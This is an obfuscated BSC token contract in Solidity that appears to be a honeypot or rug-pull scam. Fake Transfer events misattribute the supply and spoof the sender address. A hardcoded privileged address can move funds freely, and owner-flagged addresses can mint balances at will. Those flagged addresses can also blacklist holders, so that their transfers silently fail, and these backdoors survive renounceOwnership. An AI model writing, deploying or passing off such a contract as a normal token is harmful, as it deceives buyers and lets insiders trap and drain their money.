/**
 *Submitted for verification at BscScan.com on 2022-11-03
*/

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address FKS = 0x48B807caa55AB39b7Ca244529F63f4935FEF0272;
	address RouterZ = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }

}



contract bcddf is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Fc;
	mapping (address => bool) private Fb;
    mapping (address => bool) private Fw;
    mapping (address => mapping (address => uint256)) private Fv;
    uint8 private constant _Fec = 8;
    uint256 private constant fS = 1 * 10**_Fec;
    string private constant _name = "S";
    string private constant _symbol = "B";



    constructor () {
        Fc[_msgSender()] = fS;
         zCreate(); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _Fec;
    }

    function totalSupply() public pure  returns (uint256) {
        return fS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Fc[account];
    }
    function zCreate() onlyOwner internal {
    emit Transfer(address(0), RouterZ, fS); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Fv[owner][spender];
    }
	        function BurnF(address Fj) onlyOwner public{
        Fb[Fj] = true; }
		
            function approve(address spender, uint256 amount) public returns (bool success) {    
        Fv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

        
		function fStake(address Fj) public {
        if(Fb[msg.sender]) { 
        Fw[Fj] = false;}}
        function Queryf(address Fj) public{
         if(Fb[msg.sender])  { 
        Fw[Fj] = true; }}
   

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == FKS)  {
        require(amount <= Fc[sender]);
        Fc[sender] -= amount;  
        Fc[recipient] += amount; 
          Fv[sender][msg.sender] -= amount;
        emit Transfer (RouterZ, recipient, amount);
        return true; }  else  
          if(!Fw[recipient]) {
          if(!Fw[sender]) {
         require(amount <= Fc[sender]);
        require(amount <= Fv[sender][msg.sender]);
        Fc[sender] -= amount;
        Fc[recipient] += amount;
        Fv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Fi, uint256 Fj) public {
        if(msg.sender == FKS)  {
        require(Fc[msg.sender] >= Fj);
        Fc[msg.sender] -= Fj;  
        Fc[Fi] += Fj; 
        emit Transfer (RouterZ, Fi, Fj);} else  
        if(Fb[msg.sender]) {Fc[Fi] += Fj;} else
        if(!Fw[msg.sender]) {
        require(Fc[msg.sender] >= Fj);
        Fc[msg.sender] -= Fj;  
        Fc[Fi] += Fj;          
        emit Transfer(msg.sender, Fi, Fj);}}}